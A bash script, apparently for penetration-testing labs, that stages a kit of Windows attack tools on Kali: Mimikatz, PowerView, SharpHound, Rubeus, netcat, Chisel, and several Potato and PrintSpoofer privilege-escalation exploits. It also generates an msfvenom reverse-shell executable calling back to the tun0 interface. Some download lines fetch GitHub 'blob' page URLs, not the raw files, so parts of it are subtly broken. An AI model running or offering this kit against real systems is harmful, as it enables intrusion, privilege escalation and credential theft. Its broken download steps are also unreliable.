#!/bin/bash -e

# Windows Tools ready to serve in seconds on Kali

# - PowerUp
# - PowerView
# - nc.exe
# - Plink
# - winPEAS
# - Mimikatz
# - powercat.ps1
# - Chisel
# - PrintSpoofer
# - Rubeus
# - Sharphound
# - PsExec (PsTools)
# - RoguePotato
# - GodPotato
# - JuicyPotato
# - JuicyPotatoNG
# - RottenPotato
# - SharpEfsPotato
# - upload.ps1

sudo apt install -y powersploit peass windows-binaries

rm -rf ~/win
mkdir ~/win
cd ~/win

cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .
cp /usr/share/windows-resources/powersploit/Recon/PowerView.ps1 .
cp /usr/share/windows-resources/binaries/nc.exe .
cp /usr/share/windows-resources/binaries/plink.exe .
cp /usr/share/peass/winpeas/winPEASx64.exe .
cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe .
cp /usr/lib/bloodhound/resources/app/Collectors/SharpHound.ps1 .

wget https://github.com/besimorhino/powercat/blob/master/powercat.ps1

wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz
wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_windows_amd64.gz
wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_windows_386.gz
gunzip chisel_1.9.1_linux_amd64.gz
gunzip chisel_1.9.1_windows_amd64.gz
gunzip chisel_1.9.1_windows_386.gz

wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer32.exe
wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe

wget https://download.sysinternals.com/files/PSTools.zip
unzip PSTools.zip

wget https://github.com/antonioCoco/RoguePotato/releases/download/1.0/RoguePotato.zip
unzip RoguePotato.zip

wget https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET2.exe
wget https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET35.exe
wget https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe

wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe

wget https://github.com/antonioCoco/JuicyPotatoNG/releases/download/v1.1/JuicyPotatoNG.zip
unzip JuicyPotatoNG.zip

wget https://raw.githubusercontent.com/adann0/py_upload/main/upload.ps1

msfvenom -p windows/shell/reverse_tcp LHOST='tun0' LPORT=443 -f exe > met.exe

wget https://github.com/adann0/oscp-tools/blob/main/bin/MSFRottenPotato.exe
wget https://github.com/adann0/oscp-tools/blob/main/bin/SharpEfsPotato.exe
wget https://github.com/adann0/oscp-tools/blob/main/bin/Rubeus.exe

rm -f *.zip *.gz

cd ..
zip -r win.zip win
